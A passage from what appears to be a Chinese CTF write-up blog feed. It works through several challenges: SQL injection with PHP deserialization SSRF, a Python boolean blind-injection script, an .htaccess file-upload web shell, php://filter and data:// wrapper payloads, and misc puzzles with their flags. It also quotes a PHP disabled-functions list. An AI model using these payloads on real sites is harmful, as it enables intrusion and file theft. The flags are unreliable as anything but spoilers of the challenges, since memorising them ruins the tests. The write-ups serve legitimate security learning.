srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308233952457"></p><p>我们的猜测是正确的，而且该类是通过反序列化的方式调用的，/var/www/html 是网站根目录</p><p>因为2处回显点，通过sql注入可以拿到相关数据</p><blockquote><p>数据库名：fakebook 表名: users 列名:data</p></blockquote><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308234509329.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308234509329.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308234509329"></p><p>取出的数据是序列化的字符串，很明显反序列化的字符串数据被写入了数据库中，那不妨猜测这个功能相当于传入id，然后去数据库中查询到相关记录，并且将该数据反序列化，进行调用，于是我们可以构造exp了</p><h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03  构造payload"></a>0x03  构造payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="variable">$a</span>-&gt;blog=<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>O:8:”UserInfo”:3:{s:4:”name”;s:6:”hahaha”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p><blockquote><p><a href="http://3c8ee748-a9f9-46ee-99bf-f8af80d0e6eb.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:%7Bs:4:%22name%22;s:6:%22hahaha%22;s:3:%22age%22;i:0;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;%7D%27#">http://3c8ee748-a9f9-46ee-99bf-f8af80d0e6eb.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:6:%22hahaha%22;s:3:%22age%22;i:0;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27#</a></p></blockquote><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210309000557569.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210309000557569.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309000557569"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
      <link href="2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/"/>
      <url>2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/</url>
      
        <content type="html"><![CDATA[<p>这个并不是一道难题，经过简单fuzz测试应该是可以搞出来的，由于经验缺乏，一时间还是没搞出来，其本质就是一个简单的bool盲注</p><span id="more"></span><h3 id="0x01-Fuzz-测试"><a href="#0x01-Fuzz-测试" class="headerlink" title="0x01 Fuzz 测试"></a>0x01 Fuzz 测试</h3><p><img src="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120300876.png" class="lazyload" data-srcset="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120300876.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306120300876"></p><p>测试  <code>&#39;</code></p><p><img src="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120359672.png" class="lazyload" data-srcset="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120359672.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306120359672"></p><p>发现其可能和bool盲注有关</p><p>fuzz一下</p><p><img src="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120449832.png" class="lazyload" data-srcset="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120449832.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306120449832"></p><p><strong>发现过滤了 union * 等，但是if() ascii char mid substr 等都未过滤</strong></p><h3 id="0x02-题解-bool盲注"><a href="#0x02-题解-bool盲注" class="headerlink" title="0x02 题解 bool盲注"></a>0x02 题解 bool盲注</h3><p><code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code> 如此构造即可 </p><p>if(ascii(substr((select    flag    from    flag),1,1))=ascii(‘f’),1,2)    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bool_injection</span>(<span class="params">url</span>):</span></span><br><span class="line">    base_str=<span class="string">&#x27;the_result_is:...&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="built_in">min</span>=<span class="number">30</span>;<span class="built_in">max</span>=<span class="number">127</span></span><br><span class="line">        mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload=<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,2)&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            req=requests.post(url,data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">max</span>=mid</span><br><span class="line">            mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        base_str=base_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(base_str)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> bool盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[MRCTF2020]你传你🐎呢</title>
      <link href="2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/"/>
      <url>2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/</url>
      
        <content type="html"><![CDATA[<p>很基础的双文件上传绕过,通过上传.htaccess使得全目录被当做php解析</p><span id="more"></span><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173514256.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173514256.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314173514256"></p><p>上传正常图片</p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173541892.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173541892.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314173541892"></p><p>被过滤，猜测可能后端在校验时对文件大小也进行校验，导致正常图片过不了</p><p>如题目，上传图片马试试</p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173726420.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173726420.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314173726420"></p><p>图片马上传成功 但是不解析</p><p>尝试上传.htaccess    </p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174013160.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174013160.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314174013160"></p><p>成功解析，</p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174048613.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174048613.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314174048613"></p><p>查看disabled function 发现如下函数被过滤</p><blockquote><p>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</p></blockquote><p>基本过滤了命令执行所需函数，于是我们不进行命令执行仅仅进行文件读取</p><p>构造payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?M0th&#x3D;var_dump(scandir(&#39;&#x2F;&#39;)); 读取目录</span><br><span class="line">?M0th&#x3D;var_dump(file_get_contents(&#39;&#x2F;flag&#39;)); 读取flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 命令执行绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc的解题过程</title>
      <link href="2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/"/>
      <url>2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>刷一些misc，buu走起</p><span id="more"></span><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>签到题 flag{buu_ctf}</p><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>gif逐帧播放即可</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234245931.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234245931.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303234245931"></p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234155503.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234155503.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303234155503"></p><p>flag{he11ohongke}</p><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>很简单 binwalk发现隐藏其他文件</p><p>foremost分离出来 一个zip</p><p>ziperello 爆破出密码 </p><p>得到flag</p><h3 id="N种解决办法"><a href="#N种解决办法" class="headerlink" title="N种解决办法"></a>N种解决办法</h3><p>winhex打开发现是data://协议的数据</p><p>浏览器访问一下</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210304000435507.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210304000435507.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210304000435507"></p><p>扫描得到KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><h4 id="考点，png文件格式，winhex修改宽高"><a href="#考点，png文件格式，winhex修改宽高" class="headerlink" title="考点，png文件格式，winhex修改宽高"></a>考点，png文件格式，winhex修改宽高</h4><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306161014547.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306161014547.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306161014547"></p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306160724238.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306160724238.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306160724238"></p><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><p>winhex 打开文件末尾就是flag</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306162311461.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306162311461.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306162311461"></p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>archpr破解rar密码</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306164907154.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306164907154.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306164907154"></p><h3 id="乌镇各种图"><a href="#乌镇各种图" class="headerlink" title="乌镇各种图"></a>乌镇各种图</h3><p>010eidter打开 末尾就是flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="2021/02/28/ZJCTF-2019-NiZhuanSiWei/"/>
      <url>2021/02/28/ZJCTF-2019-NiZhuanSiWei/</url>
      
        <content type="html"><![CDATA[<p>一道相对简单的绕过题，主要用到了一些php伪协议</p><span id="more"></span><h3 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h3><p>一些常见的php伪协议</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>元封装器，设计用于数据流打开时的筛选过滤应用</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure></blockquote><p>可选择采用多种过滤器（字符串/转换/压缩/加密）</p><p>常用payload用于读源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=upload.php</span></span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p><strong>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。</strong></p><blockquote><p>allow_url_fopen ：off/on<br>allow_url_include：on</p><p>且enctype=“multipart/from-data” 时 php://input 无效</p></blockquote><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>数据流封装器 data:资源类型;&lt;编码&gt;,内容</p><blockquote><p>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xxx.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><p>0x02 解题过程wp</p><p>直接源码贴</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123; <span class="comment">#利用data://协议绕过</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//查看useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8b5645ba-c840-468a-b33c-c48d8810e9b3.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p><img src="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303215618817.png" class="lazyload" data-srcset="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303215618817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303215618817"></p><p>伪协议读出 useless的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 